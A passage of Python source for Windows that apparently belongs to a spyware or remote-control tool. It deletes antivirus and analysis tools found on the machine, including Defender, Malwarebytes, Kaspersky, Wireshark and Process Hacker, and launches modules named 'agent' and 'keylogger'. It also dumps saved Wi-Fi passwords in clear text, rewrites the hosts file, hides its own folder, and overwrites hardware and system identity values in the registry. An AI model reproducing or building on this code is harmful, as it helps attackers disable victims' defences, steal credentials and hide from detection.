                    ) or ('internetsecurity' in name_setup_antivirus_and_tool
                    ) or ('defender' in name_setup_antivirus_and_tool
                    ) or ('av' in name_setup_antivirus_and_tool
                    ) or ('malwarebytes' in name_setup_antivirus_and_tool
                    ) or ('mbsetup' in name_setup_antivirus_and_tool
                    ) or ('eset' in name_setup_antivirus_and_tool
                    ) or ('bitdefender' in name_setup_antivirus_and_tool
                    ) or ('mcafee' in name_setup_antivirus_and_tool
                    ) or ('webadvisorinstaller' in name_setup_antivirus_and_tool
                    ) or ('kaspersky' in name_setup_antivirus_and_tool
                    ) or ('dr' in name_setup_antivirus_and_tool and 'web' in name_setup_antivirus_and_tool
                    ) or ('norton' in name_setup_antivirus_and_tool
                    ) or ('avast' in name_setup_antivirus_and_tool
                    ) or ('avg' in name_setup_antivirus_and_tool
                    ) or ('panda' in name_setup_antivirus_and_tool
                    ) or ('sophos' in name_setup_antivirus_and_tool
                    ) or ('avira' in name_setup_antivirus_and_tool
                    ) or ('360ts_setup' in name_setup_antivirus_and_tool
                    ) or ('360' in name_setup_antivirus_and_tool and 'total' in name_setup_antivirus_and_tool
                    ) or ('savsetupg' in name_setup_antivirus_and_tool
                    ) or ('escan' in name_setup_antivirus_and_tool
                    ) or ('clamav' in name_setup_antivirus_and_tool
                    ) or ('emsisoft' in name_setup_antivirus_and_tool
                    ) or ('g' in name_setup_antivirus_and_tool and 'data' in name_setup_antivirus_and_tool
                    ) or ('sysdiag' in name_setup_antivirus_and_tool
                    ) or ('quick' in name_setup_antivirus_and_tool and 'security' in name_setup_antivirus_and_tool
                    ) or ('qhis' in name_setup_antivirus_and_tool
                    ) or ('qhts' in name_setup_antivirus_and_tool
                    ) or ('qhav' in name_setup_antivirus_and_tool
                    ) or ('superantispyware' in name_setup_antivirus_and_tool
                    ) or ('housecalllauncher' in name_setup_antivirus_and_tool
                    ) or ('vipre' in name_setup_antivirus_and_tool
                    ) or ('zillya' in name_setup_antivirus_and_tool
                    ) or ('cispro' in name_setup_antivirus_and_tool
                    ) or ('nano' in name_setup_antivirus_and_tool
                    ) or ('ad' in name_setup_antivirus_and_tool and 'aware' in name_setup_antivirus_and_tool
                    ) or ('maxtsdm' in name_setup_antivirus_and_tool
                    ) or ('setup' in name_setup_antivirus_and_tool and 'eng' in name_setup_antivirus_and_tool
                    ) or ('forticlient' in name_setup_antivirus_and_tool
                    ) or ('setupvu' in name_setup_antivirus_and_tool
                    ) or ('apinstaller' in name_setup_antivirus_and_tool
                    ) or ('total' in name_setup_antivirus_and_tool and 'av' in name_setup_antivirus_and_tool
                    ) or ('f' in name_setup_antivirus_and_tool and 'secure' in name_setup_antivirus_and_tool
                    ) or ('clario' in name_setup_antivirus_and_tool
                    ) or ('clean' in name_setup_antivirus_and_tool
                    ) or ('clear' in name_setup_antivirus_and_tool
                    ) or ('aida64' in name_setup_antivirus_and_tool
                    ) or ('processhacker' in name_setup_antivirus_and_tool
                    ) or ('systeminformer' in name_setup_antivirus_and_tool
                    ) or ('process' in name_setup_antivirus_and_tool and 'explorer' in name_setup_antivirus_and_tool
                    ) or ('ccsetup' in name_setup_antivirus_and_tool
                    ) or ('ccleaner' in name_setup_antivirus_and_tool
                    ) or ('revo' in name_setup_antivirus_and_tool and 'unin' in name_setup_antivirus_and_tool
                    ) or ('tweaker' in name_setup_antivirus_and_tool
                    ) or ('wireshark' in name_setup_antivirus_and_tool
                    ) or ('cmder' in name_setup_antivirus_and_tool
                    ) or ('winaero' in name_setup_antivirus_and_tool and 'tweaker' in name_setup_antivirus_and_tool
                    ) or ('privazer' in name_setup_antivirus_and_tool
                    ) or ('cleanmgr' in name_setup_antivirus_and_tool
                    ) or ('pc' in name_setup_antivirus_and_tool and 'manager' in name_setup_antivirus_and_tool
                    ) or ('wisecare' in name_setup_antivirus_and_tool
                    ) or ('wsmsetup' in name_setup_antivirus_and_tool
                    ) or ('wrcfree' in name_setup_antivirus_and_tool
                    ) or ('wdcfree' in name_setup_antivirus_and_tool
                    ) or ('wmosetup' in name_setup_antivirus_and_tool
                    ) or ('wgbsetup' in name_setup_antivirus_and_tool
                    ) or ('wjssetup' in name_setup_antivirus_and_tool
                    ) or ('wpcasetup' in name_setup_antivirus_and_tool
                    ) or ('eclea' in name_setup_antivirus_and_tool
                    ) or ('clean' in name_setup_antivirus_and_tool and 'master' in name_setup_antivirus_and_tool
                    ) or ('auslogics' in name_setup_antivirus_and_tool
                    ) or ('bleachbit' in name_setup_antivirus_and_tool
                    ) or ('ashampoo' in name_setup_antivirus_and_tool
                    ) or ('fastcomputergo' in name_setup_antivirus_and_tool
                    ) or ('kerish' in name_setup_antivirus_and_tool
                    ) or ('bcuninstaller' in name_setup_antivirus_and_tool
                    ) or ('iobit' in name_setup_antivirus_and_tool
                    ) or ('oosu' in name_setup_antivirus_and_tool
                    ) or ('gusetup' in name_setup_antivirus_and_tool
                    ) or ('gupsetup' in name_setup_antivirus_and_tool
                    ) or ('glary' in name_setup_antivirus_and_tool
                    ) or ('spyhunter' in name_setup_antivirus_and_tool
                    ) or ('telamoncleaner' in name_setup_antivirus_and_tool
                    ) or ('windows' in name_setup_antivirus_and_tool and 'update' in name_setup_antivirus_and_tool and 'fixer' in name_setup_antivirus_and_tool
                    ) or ('dism++' in name_setup_antivirus_and_tool
                    ) or ('dismplusplus' in name_setup_antivirus_and_tool
                    ) or ('destroy' in name_setup_antivirus_and_tool and 'windows' in name_setup_antivirus_and_tool and 'spying' in name_setup_antivirus_and_tool
                    ) or ('dws' in name_setup_antivirus_and_tool and 'lite' in name_setup_antivirus_and_tool
                ): 
                    try: 
                        remove(setup_antivirus_path_and_tool_path)
                    except: 
                        del_file(setup_antivirus_path_and_tool_path)
            except: 
                continue


def setup_module(module, name, file_path, mode):
    if mode == '-e':
        with open(file_path, 'w') as module_status_file: 
            module_status_file.write('1')
            
        Thread(target=module, name=name).start()
    else: 
        with open(file_path, 'w') as module_status_file: 
            module_status_file.write('0')


def start_modules():
    for module in [
        (agent, rf'{PATH}\config\D3S7-C504-B97D-4CBE-BEB9-83DC-C1B6-4V61', 'agent'), 
        (keylogger, rf'{PATH}\config\C011-1592-C58D-4C45-B7D2-6617-6DDB-5D59', 'keylogger'), 
        (block_app, rf'{PATH}\config\F737-831C-210B-48D6-8208-065E-CEB8-E919', 'app')
    ]:
        try:       
            with open(module[1], 'r') as module_status_file:
                if module_status_file.read().strip() == '1': 
                    Thread(target=lambda: module[0](mode=0), name=module[-1]).start()
        except: 
            continue


def start_apps():
    with open(rf'{PATH}\config\D566-D7D7-DCD6-471C-8109-BE0A-D331-99E3', 'r') as startup_apps:
        for _start_app in startup_apps.read().split('\n'):
            info_app = _start_app.split('-->')
            app_path = info_app[-1].strip()
            app_args = info_app[-2].strip().split('|')[-1][:-1].strip()

            try: 
                startfile(app_path, arguments=app_args if app_args != 'NULL' else '', show_cmd=False)
            except: 
                continue


def module_report(file_path):
    try:
        with open(file_path, 'w') as module_status_file:
            module_status_file.write('1')
    except: 
        return
    

def status_module(name, file_path):
    try:
        with open(file_path, 'r') as module_status_file:
            return [name, 'off' if module_status_file.read().strip() == '0' else 'on'] 
    except: 
        return [name, 'off']
    
    
def regedit(reg_path, name, value, object_type, mode, current_user=False):
    match mode:
        case 0:
            with CreateKey(HKEY_LOCAL_MACHINE if not current_user else HKEY_CURRENT_USER, reg_path): 
                return
        case 1:
            match object_type: 
                case 0: 
                    reg_type = REG_DWORD
                case 1: 
                    reg_type = REG_SZ
                case _: 
                    reg_type = REG_EXPAND_SZ

            with OpenKey(HKEY_LOCAL_MACHINE if not current_user else HKEY_CURRENT_USER, reg_path, 0, KEY_SET_VALUE) as reg_key: 
                SetValueEx(reg_key, name, 0, reg_type, value)
        case _:
            with OpenKey(HKEY_LOCAL_MACHINE, reg_path, 0, KEY_SET_VALUE) as reg_key: 
                if mode == 3:
                    DeleteKey(reg_key, name) 
                else: 
                    DeleteValue(reg_key, name)


def reg_device(reg_path=None, value=None, content=None, variable=None, mode=None):
    try:
        match mode:
            case 0:
                try: 
                    regedit(reg_path, value, content, 1, 1)
                except: 
                    return
            case 1: 
                for digit_path in range(100):
                    try: 
                        regedit(rf'{reg_path}\{digit_path}', value, content, 1, 1)
                    except: 
                        continue
            case 2:
                device_path = []

                with open(reg_path, 'r') as device_path_file:
                    for _device_path in device_path_file.read().split('\n'):
                        if variable in (_device_path_ := _device_path.split()): 
                            device_path.append(' '.join(_device_path_[2:]))

                for _reg_path in device_path:
                    try: 
                        regedit(_reg_path, value, content, 1, 1)
                    except: 
                        continue
            case 3:
                device_data = []

                with open(reg_path, 'r') as device_name_recovery_file:
                    for _device_name_recovery in device_name_recovery_file.read().split('\n'):
                        if variable in (_device_name_recovery_ := _device_name_recovery.split()): 
                            device_data.append(_device_name_recovery_[2:])
                
                return device_data
            case _:
                names = [] 
                reg_paths = []

                with open(reg_path, 'r') as device_path_file:
                    for _device_path in device_path_file.read().split('\n'):
                        try:
                            if variable[0] in _device_path: 
                                names.append(' '.join(_device_path.split()[2:]))
                            elif variable[-1]: 
                                reg_paths.append(_device_path.split()[-1])
                        except: 
                            continue

                for _device_ in list(zip(names, reg_paths)):
                    if _device_[0] == content: 
                        try: 
                            regedit(_device_[-1], value, _device_[0], 1, 1)
                        except: 
                            continue
    except:
        return


def search_device(file_path, variable=None, command=None, mode=3):
    try:
        match mode:
            case 0:
                try: 
                    bios_baseboard_product = cmd(run('wmic BASEBOARD get product'.split(), 
                        stdout=PIPE, stderr=DEVNULL, shell=True).stdout).split('\n')[1].strip()
                except: 
                    bios_baseboard_product = 'NOT FOUND'
                
                try: 
                    bios_baseboard_manufacturer = cmd(run('wmic BASEBOARD get Manufacturer'.split(), 
                        stdout=PIPE, stderr=DEVNULL, shell=True).stdout).split('\n')[1].strip()
                except: 
                    bios_baseboard_manufacturer = 'NOT FOUND'
                
                try: 
                    bios_manufacturer = cmd(run('wmic BIOS get Manufacturer'.split(), 
                        stdout=PIPE, stderr=DEVNULL, shell=True).stdout).split('\n')[1].strip()
                except: 
                    bios_manufacturer = 'NOT FOUND'
                
                try: 
                    bios_version = cmd(run('wmic BIOS get SMBIOSBIOSVersion'.split(), 
                        stdout=PIPE, stderr=DEVNULL, shell=True).stdout).split('\n')[1].strip()
                except: 
                    bios_version = 'NOT FOUND'
                
                try: 
                    with OpenKeyEx(HKEY_LOCAL_MACHINE, r'HARDWARE\DESCRIPTION\System\BIOS') as reg_key: 
                        bios_date = QueryValueEx(reg_key, 'BIOSReleaseDate')[0]
                except: 
                    bios_date = 'NOT FOUND'
                
                with open(file_path, 'w') as device_file: 
                    device_file.write(
                        f'BASEBOARD = {bios_baseboard_product}\n' + 
                        f'BASEBOARD_MANUFACTURER = {bios_baseboard_manufacturer}\n' + 
                        f'BIOS_MANUFACTURER = {bios_manufacturer}\n' + 
                        f'BIOS_VERSION = {bios_version}\n' + 
                        f'BIOS_DATE = {bios_date}\n' + 
                        'BIOS_PATH = HARDWARE\\DESCRIPTION\\System\\BIOS'
                    )
            case 1:
                try: 
                    cpu_caption = cmd(run('wmic CPU get Caption'.split(), 
                        stdout=PIPE, stderr=DEVNULL, shell=True).stdout).split('\n')[1].strip()
                except: 
                    cpu_caption = 'NOT FOUND'
                
                try: 
                    cpu_name = cmd(run('wmic CPU get Name'.split(), 
                        stdout=PIPE, stderr=DEVNULL, shell=True).stdout).split('\n')[1].strip()
                except: 
                    cpu_name = 'NOT FOUND'
                
                try: 
                    cpu_manufacturer = cmd(run('wmic CPU get Manufacturer'.split(), 
                        stdout=PIPE, stderr=DEVNULL, shell=True).stdout).split('\n')[1].strip()
                except: 
                    cpu_manufacturer = 'NOT FOUND'
                
                with open(file_path, 'w') as device_file: 
                    device_file.write(
                        f'CPU_CAPTION = {cpu_caption}\n' + 
                        f'CPU_NAME = {cpu_name}\n' + 
                        f'CPU_MANUFACTURER = {cpu_manufacturer}\n' + 
                        'CPU_PATH_CENTRAL = HARDWARE\\DESCRIPTION\\System\\CentralProcessor\n' + 
                        'CPU_PATH_FLOATING = HARDWARE\\DESCRIPTION\\System\\FloatingPointProcessor'
                    )
            case 2:
                with open(file_path, 'w') as device_file: 
                    device_file.write(
                        'MOUSE_ENABLE = rundll32 mouse, enable\n' + 
                        'MOUSE_DISABLE = rundll32 mouse, disable\n' + 
                        'KEYBOARD_ENABLE = rundll32 keyboard, enable\n' + 
                        'KEYBOARD_DISABLE = rundll32 keyboard, disable\n' + 
                        'ETHERNET_ENABLE = sc start dot3svc\n' + 
                        'ETHERNET_DISABLE = sc stop dot3svc\n' + 
                        'WLAN_ENABLE = sc start WlanSvc\n' + 
                        'WLAN_DISABLE = sc stop WlanSvc\n' + 
                        'BLUETOOTH_ENABLE = sc start bthserv\n' + 
                        'BLUETOOTH_DISABLE = sc stop bthserv\n' + 
                        'CAMERA_PATH = SOFTWARE\\Policies\\Microsoft\\Camera\n' + 
                        'PRINTER_ENABLE = sc start Spooler\n' + 
                        'PRINTER_DISABLE = sc stop Spooler'
                    )
            case 3: 
                with open(file_path, 'w') as device_file:
                    for _device_object in list(zip(
                        [device_object.strip() for device_object in cmd(run(
                            command[0].split(), stdout=PIPE, stderr=DEVNULL, shell=True
                        ).stdout).split('\n')[1:] if device_object.strip()], 
                        [device_object.strip() for device_object in cmd(run(
                            command[1].split(), stdout=PIPE, stderr=DEVNULL, shell=True
                        ).stdout).split('\n')[1:] if device_object.strip()]
                    )): 
                        device_file.write(f'{variable[0]} = {_device_object[0]}\n' + 
                            f'{variable[1]} = SYSTEM\\CurrentControlSet\\Enum\\{_device_object[1]}\n')
            case _:
                try: 
                    product_code = cmd(run('wmic OS get SerialNumber'.split(), 
                        stdout=PIPE, stderr=DEVNULL, shell=True).stdout).split()[-1]
                except: 
                    product_code = 'NOT FOUND'
                
                with open(file_path, 'w') as device_file: 
                    device_file.write(
                        'NODE_PATH_1 = SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ActiveComputerName\n' + 
                        'NODE_PATH_2 = SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ComputerName\n' + 
                        'PLATFORM_PATH = SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\n' + 
                        f'NODE = {node()}\n' + 
                        f'PLATFORM = {system()} {release()}\n' + 
                        f'VERSION = {version()}\n' + 
                        f'EDITION = {win32_edition()}\n' + 
                        f'PRODUCT_CODE = {product_code}'
                    )
    except: 
        return
    

def get_http(url, file=''):
    if file:
        with open(file, 'wb') as http_file:
            http_file.write(get_http_code(url, headers=HEADERS, timeout=10).content)
    else:
        return get_http_code(url, headers=HEADERS, timeout=10).text
    

def del_file(file_path):
    for cmd_del_command in [
        f'del /q /f {file_path}', 
        f'del /q /f /A:H {file_path}', 
        f'del /q /f /A:S {file_path}'
    ]:
        try:
            if not exists(file_path): 
                return
            
            run(cmd_del_command, stdout=DEVNULL, stderr=DEVNULL, shell=True)
        except: 
            continue


def _delete_directory(directory):
    folder_paths = []

    for folder_path in [_folder_path[0] for _folder_path in directory]: 
        for _path in glob(f'{folder_path}\\*'): 
            if not isfile(_path): 
                try: 
                    folder_paths.append(_path)
                except: 
                    continue
            else: 
                try: 
                    remove(_path)
                except: 
                    del_file(_path)

    for folder_directory in folder_paths[::-1]:
        try: 
            rmdir(folder_directory)
        except: 
            continue


def delete_directory(directory_path, mode=0):
    if exists(directory_path): 
        run(f'rmdir /Q /S {directory_path}'.split(), stdout=DEVNULL, stderr=DEVNULL, shell=True)
    else:
        if mode == 1: 
            raise FileNotFoundError(f'[WinError 2] The specified folder was not found: \'{directory_path}\'')
    
    if exists(directory_path):
        try: 
            rmdir(directory_path)
        except: 
            _delete_directory(list(walk(directory_path)))
            rmdir(directory_path)


def clean_folder_file(mode):
    try: 
        match mode:
            case 0: 
                remove(rf'{PATH}\file\1B8C-069C-0529-4633-8FDC-2FE9-2D30-CE5B.png')
            case 1: 
                remove(rf'{PATH}\file\E1C8-0936-66F4-4DD1-BE56-A0E1-5B1A-9023.png')
            case 2: 
                remove(rf'{PATH}\file\881V1-38B8-9B39-94AA-4B09-E2E5-1746-4A89.mp3')
            case 3: 
                remove(rf'{PATH}\file\V7FB-FAAE-A543-42CE-AF39-CFAC8-449-EE1E.mp3')
            case 4: 
                remove(rf'{PATH}\file\49AD-4DD3-22FF-170E-F83E-21AF-4EEB-92B5.mp4')
            case _: 
                remove(rf'{PATH}\file\2328-6639-9EAA-AB39-D099-56B2-9C94-EFEF.mp4')
    except: 
        return


def get_wifi_password():
    _ssid = []
    ssid = []
    clean_ssid = []
    _password = []
    password = []
    clean_password = []

    for _profile_ in findall(r'[:]\s([A-Z]{2}\S+)', run('netsh wlan show profile'.split(), 
        stdout=PIPE, stderr=DEVNULL, shell=True).stdout.decode('cp866')
    ): 
        ssid.append(findall(r'SSID.+[:]\s"(\S.+)"', _network := run(
            f'netsh wlan show profile {_profile_} key=clear'.split(), stdout=PIPE, stderr=DEVNULL, shell=True
        ).stdout.decode('cp866')))
        password.append(_password if (_password := findall(r'Key Content\s+[:]\s(\S.+)\r', _network)
            ) else findall(r'Содержимое ключа\s+[:]\s(\S.+)\r', _network)
        )
    
    for network in list(zip(ssid, password)): 
        try: 
            _ssid.append(network[0][0])
            _password.append(network[1][0])
        except: 
            continue

    for _ssid_ in _ssid:
        try:
            if _ssid_ not in clean_ssid: 
                clean_ssid.append(_ssid_)
        except: 
            clean_ssid.append('NOT FOUND')

    for _password_ in _password:
        try:
            if _password_ not in clean_password: 
                clean_password.append(_password_) 
        except: 
            clean_password.append('NOT FOUND')

    return list(zip(clean_ssid, clean_password))
    

def wifi():
    _wifi = cmd(run('netsh wlan show all'.split(), 
                    stdout=PIPE, stderr=DEVNULL, shell=True).stdout)

    if not (_wifi_ := list(zip(
        findall(r'^SSID\s\d+[:]\s(\S.+)\r', _wifi, flags=MULTILINE), 
        [bssid.upper() for bssid in findall(r'^\s+BSSID\s\d+[:]\s+(\S.+)\r', _wifi, flags=MULTILINE)], 
        findall(r'(\d+%)', _wifi)[1:]
    ))): 
        _wifi_ = list(zip(
            findall(r'^SSID\s\d+\s[:]\s(\S.+)\r', _wifi, flags=MULTILINE), 
            [bssid.upper() for bssid in findall(r'^\s+BSSID\s\d+\s+[:]\s(\S.+)\r', _wifi, flags=MULTILINE)], 
            findall(r'(\d+%)', _wifi)[1:]
        ))
    
    return tabulate(
        _wifi_, 
        headers=[('SSID'), ('BSSID'), ('SIGNAL')], 
        tablefmt='pipe'
        ) if _wifi_ else cmd(run('netsh wlan show all'.split(), 
                                 stdout=PIPE, stderr=DEVNULL, shell=True).stdout
    )


def block_site(name=None, delete_name=None, restart=False):
    try: 
        if not exists(r'C:\Windows\System32\drivers\etc'): 
            mkdir(r'C:\Windows\System32\drivers\etc')
    except: ...

    _hosts_data = ''

    if delete_name:
        with open(r'C:\Windows\System32\drivers\etc\hosts', 'r', encoding='utf-8') as hosts: 
            hosts_data = hosts.read().split('\n')

        for blocked_website in hosts_data:
            try:
                if blocked_website and not delete_name in blocked_website: 
                    _hosts_data += f'{blocked_website.strip()}\n'
            except: 
                continue

        with open(r'C:\Windows\System32\drivers\etc\hosts', 'w', encoding='utf-8') as hosts: 
            hosts.write(_hosts_data)
    elif not restart:
        date_site = get_date()

        with open(r'C:\Windows\System32\drivers\etc\hosts', 'r+', encoding='utf-8') as hosts: 
            if not name.lower() in hosts.read().lower(): 
                hosts.write(f'127.0.0.1       {name}       # {date_site[0]} | {date_site[-1]}\n')
    else:
        with open(r'C:\Windows\System32\drivers\etc\hosts', 'w', encoding='utf-8') as hosts: 
            hosts.write("""# Copyright (c) 1993-2009 Microsoft Corp.
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
#
# This file contains the mappings of IP addresses to host names. Each
# entry should be kept on an individual line. The IP address should
# be placed in the first column followed by the corresponding host name.
# The IP address and the host name should be separated by at least one
# space.
#
# Additionally, comments (such as these) may be inserted on individual
# lines or following the machine name denoted by a '#' symbol.
#
# For example:
#
#      102.54.94.97     rhino.acme.com          # source server
#       38.25.63.10     x.acme.com              # x client host
#
# localhost name resolution is handled within DNS itself.
#	127.0.0.1       localhost
#	::1             localhost\n""")
            

def device(
    session=None,
    device_id=None, 
    device_status=None, 
    usb=None, 
    computer_name=None, 
    computer_platform=None, 
    computer_version=None, 
    computer_edition=None, 
    computer_product_code=None, 
    motherboard_name=None, 
    motherboard_product=None, 
    bios_name=None, 
    bios_version=None, 
    bios_date=None, 
    cpu=None, 
    cpu_name=None, 
    cpu_id=None, 
    video_card=None, 
    disk=None, 
    monitor=None, 
    sound_device=None, 
    network_adapter=None, 
    mode=0
):
    

    def loger(status=None, variable=None, value=None, error=None, mode=0, text=None):
        date_loger = get_date()

        if mode == 0:
            try: 
                if not error:
                    with open(rf'{PATH}\devices\__LOG__.bin', 'a+', encoding='utf-8') as log_bin: 
                        log_bin.write('[{date_loger[0]}|{date_loger[-1]}]: ON --> {variable} = {value}\n' if 'enable' in status.lower(
                            ) else f'[{date_loger[0]}|{date_loger[-1]}]: OFF --> {variable} = {value}\n')
                else:
                    with open(rf'{PATH}\devices\__LOG__.bin', 'a+', encoding='utf-8') as log_bin: 
                        log_bin.write(f'[{date_loger[0]}|{date_loger[-1]}]: ERROR = {type(error).__name__} | DESCRIPTION = {error}\n')
            except: 
                return
        else: 
            try:
                with open(rf'{PATH}\devices\__LOG__.bin', 'a+', encoding='utf-8') as log_bin: 
                    log_bin.write(f'[{date_loger[0]}|{date_loger[-1]}]: {text}\n')
            except: 
                return
            

    device_name_recovery = []

    match mode:
        case 0:
            adapter_name = []

            try: 
                if not exists(f'{PATH}\\devices'):
                    mkdir(f'{PATH}\\devices')
                    run(f'attrib +h +s +r {PATH}\\devices'.split(), stdout=DEVNULL, stderr=DEVNULL, shell=True)
            except: ...

            try: 
                search_device(rf'{PATH}\devices\__COMPUTER__.bin', mode=4)
            except: ...
            else: 
                loger(text='Created --> __COMPUTER__.bin', mode=1) 

            for device_data in [
                (rf'{PATH}\devices\__BIOS__.bin', 0), 
                (rf'{PATH}\devices\__CPU__.bin', 1), 
                (rf'{PATH}\devices\__USB__.bin', 2)
            ]:
                try: 
                    if not exists(device_data[0]): 
                        search_device(device_data[0], mode=device_data[-1])
                except: 
                    continue
                else: 
                    loger(text=f'Created --> {device_data[0][device_data[0].rindex('\\') + 1:]}', mode=1) 
            
            for device_data in [
                (
                    rf'{PATH}\devices\__DISK__.bin', 
                    ['DISK_NAME', 'DISK_PATH'], 
                    ['wmic DISKDRIVE get Caption', 'wmic DISKDRIVE get PNPDeviceID']
                ),  
                (
                    rf'{PATH}\devices\__VIDEOCARD__.bin', 
                    ['VIDEO_CARD_NAME', 'VIDEO_CARD_PATH'], 
                    ['wmic PATH win32_videocontroller get VideoProcessor', 'wmic PATH win32_videocontroller get PNPDeviceID']
                ), 
                (
                    rf'{PATH}\devices\__MONITOR__.bin', 
                    ['MONITOR_NAME', 'MONITOR_PATH'], 
                    ['wmic DESKTOPMONITOR get Caption', 'wmic DESKTOPMONITOR get PNPDeviceID']
                ), 
                (
                    rf'{PATH}\devices\__SOUNDDEVICE__.bin', 
                    ['SOUND_DEVICE_NAME', 'SOUND_DEVICE_PATH'], 
                    ['wmic SOUNDDEV get Caption', 'wmic SOUNDDEV get PNPDeviceID']
                )
            ]:
                try: 
                    if not exists(device_data[0]): 
                        search_device(*device_data)
                except: 
                    continue
                else: 
                    loger(text=f'Created --> {device_data[0][device_data[0].rindex('\\') + 1:]}', mode=1) 
            
            for reg_path in (adapter_reg_path := [rf'SYSTEM\CurrentControlSet\Enum\{_adapter_reg_path}' for _adapter_reg_path in cmd(run(
                    'wmic NIC get PNPDeviceID'.split(), stdout=PIPE, stderr=DEVNULL, shell=True).stdout).split()[1:]]
            ):
                try:
                    with OpenKeyEx(HKEY_LOCAL_MACHINE, reg_path) as reg_key: 
                        adapter_name.append(QueryValueEx(reg_key, 'FriendlyName')[0])
                except: 
                    continue
            
            try:
                with open(rf'{PATH}\devices\__ADAPTER__.bin', 'w') as adapter_bin:
                    for adapter_data in list(zip(adapter_name, adapter_reg_path)): 
                        adapter_bin.write(f'ADAPTER_NAME = {adapter_data[0]}\n' + f'ADAPTER_PATH = {adapter_data[-1]}\n')
            except: ...
            else: 
                loger(text='Created --> __ADAPTER__.bin', mode=1) 
        case 1: 
            for _variable in [
                ('NODE_1', rf'{PATH}\devices\__COMPUTER__.bin', 'NODE'), 
                ('NODE_2', rf'{PATH}\devices\__COMPUTER__.bin', 'NODE'), 
                ('PLATFORM', rf'{PATH}\devices\__COMPUTER__.bin', 'PLATFORM'), 
                ('PLATFORM_VERSION', rf'{PATH}\devices\__COMPUTER__.bin', 'VERSION'), 
                ('PLATFORM_EDITION', rf'{PATH}\devices\__COMPUTER__.bin', 'EDITION'), 
                ('PRODUCT_CODE', rf'{PATH}\devices\__COMPUTER__.bin', 'PRODUCT_CODE'), 
                ('BASEBOARD_MANUFACTURER', rf'{PATH}\devices\__BIOS__.bin', 'BASEBOARD_MANUFACTURER'), 
                ('BASEBOARD', rf'{PATH}\devices\__BIOS__.bin', 'BASEBOARD'), 
                ('BIOS_MANUFACTURER', rf'{PATH}\devices\__BIOS__.bin', 'BIOS_MANUFACTURER'), 
                ('BIOS_VERSION', rf'{PATH}\devices\__BIOS__.bin', 'BIOS_VERSION'), 
                ('BIOS_DATE', rf'{PATH}\devices\__BIOS__.bin', 'BIOS_DATE'), 
                ('CPU_CAPTION', rf'{PATH}\devices\__CPU__.bin', 'CPU_CAPTION'), 
                ('CPU_NAME', rf'{PATH}\devices\__CPU__.bin', 'CPU_NAME'), 
                ('CPU_MANUFACTURER', rf'{PATH}\devices\__CPU__.bin', 'CPU_MANUFACTURER'), 
                ('VIDEOCARD', rf'{PATH}\devices\__VIDEOCARD__.bin', 'VIDEO_CARD_NAME'), 
                ('MONITOR', rf'{PATH}\devices\__MONITOR__.bin', 'MONITOR_NAME'), 
                ('DISK', rf'{PATH}\devices\__DISK__.bin', 'DISK_NAME'), 
                ('SOUNDDEVICE', rf'{PATH}\devices\__SOUNDDEVICE__.bin', 'SOUND_DEVICE_NAME'), 
                ('ADAPTER', rf'{PATH}\devices\__ADAPTER__.bin', 'ADAPTER_NAME')
            ]:
                try: 
                    _device_name_recovery = reg_device(reg_path=_variable[1], variable=_variable[2], mode=3)
                except: 
                    continue
                else: 
                    device_name_recovery.append([_variable[0]] + [_device_name_recovery] + [_variable[-1]])
            
            for _device in device_name_recovery:
                try:  
                    if _device[0] == 'NODE_1': 
                        reg_device(
                            rf'{PATH}\devices\__COMPUTER__.bin', 
                            'ComputerName', 
                            ' '.join(_device[1][0]), 
                            variable='NODE_PATH_1', mode=2
                        )
                        loger(text=f'Recovered NODE_1 --> {" ".join(_device[1][0])}', mode=1) 
                    elif _device[0] == 'NODE_2': 
                        reg_device(
                            rf'{PATH}\devices\__COMPUTER__.bin', 
                            'ComputerName', 
                            ' '.join(_device[1][0]), 
                            variable='NODE_PATH_2', 
                            mode=2
                        )
                        loger(text=f'Recovered NODE_2 --> {" ".join(_device[1][0])}', mode=1) 
                    elif _device[0] == 'PLATFORM': 
                        reg_device(
                            rf'{PATH}\devices\__COMPUTER__.bin', 
                            'ProductName', 
                            ' '.join(_device[1][0]),
                            variable='PLATFORM_PATH', 
                            mode=2
                        )
                        loger(text=f'Recovered PLATFORM --> {" ".join(_device[1][0])}', mode=1)  
                    elif _device[0] == 'PLATFORM_VERSION': 
                        reg_device(
                            rf'{PATH}\devices\__COMPUTER__.bin', 
                            'CurrentBuild', 
                            ' '.join(_device[1][0]), 
                            variable='PLATFORM_PATH', 
                            mode=2
                        )
                        reg_device(
                            rf'{PATH}\devices\__COMPUTER__.bin', 
                            'CurrentBuildNumber', 
                            ' '.join(_device[1][0]), 
                            variable='PLATFORM_PATH', 
                            mode=2
                        )
                        loger(text=f'Recovered PLATFORM_VERSION --> {" ".join(_device[1][0])}', mode=1)      
                    elif _device[0] == 'PLATFORM_EDITION': 
                        reg_device(
                            rf'{PATH}\devices\__COMPUTER__.bin', 
                            'EditionID', 
                            ' '.join(_device[1][0]), 
                            variable='PLATFORM_PATH', 
                            mode=2
                        )
                        loger(text=f'Recovered PLATFORM_EDITION --> {" ".join(_device[1][0])}', mode=1)
                    elif _device[0] == 'PRODUCT_CODE': 
                        reg_device(
                            rf'{PATH}\devices\__COMPUTER__.bin', 
                            'ProductId', 
                            ' '.join(_device[1][0]), 
                            variable='PLATFORM_PATH', 
                            mode=2
                        )
                        loger(text=f'Recovered PRODUCT_CODE --> {" ".join(_device[1][0])}', mode=1)
                    elif _device[0] == 'BASEBOARD_MANUFACTURER': 
                        reg_device(
                            r'HARDWARE\DESCRIPTION\System\BIOS', 
                            'BaseBoardManufacturer', 
                            ' '.join(_device[1][0]), 
                            mode=0
                        )
                        loger(text=f'Recovered BASEBOARD_MANUFACTURER --> {" ".join(_device[1][0])}', mode=1)
                    elif _device[0] == 'BASEBOARD': 
                        reg_device(
                            r'HARDWARE\DESCRIPTION\System\BIOS',
                            'BaseBoardProduct', 
                            ' '.join(_device[1][0]), 
                            mode=0
                        )
                        loger(text=f'Recovered BASEBOARD --> {" ".join(_device[1][0])}', mode=1)
                    elif _device[0] == 'BIOS_MANUFACTURER': 
                        reg_device(
                            r'HARDWARE\DESCRIPTION\System\BIOS', 
                            'BIOSVendor', 
                            ' '.join(_device[1][0]), 
                            mode=0
                        )
                        loger(text=f'Recovered BIOS_MANUFACTURER --> {" ".join(_device[1][0])}', mode=1)
                    elif _device[0] == 'BIOS_VERSION': 
                        reg_device(
                            r'HARDWARE\DESCRIPTION\System\BIOS', 
                            'BIOSVersion', 
                            ' '.join(_device[1][0]), 
                            mode=0
                        )
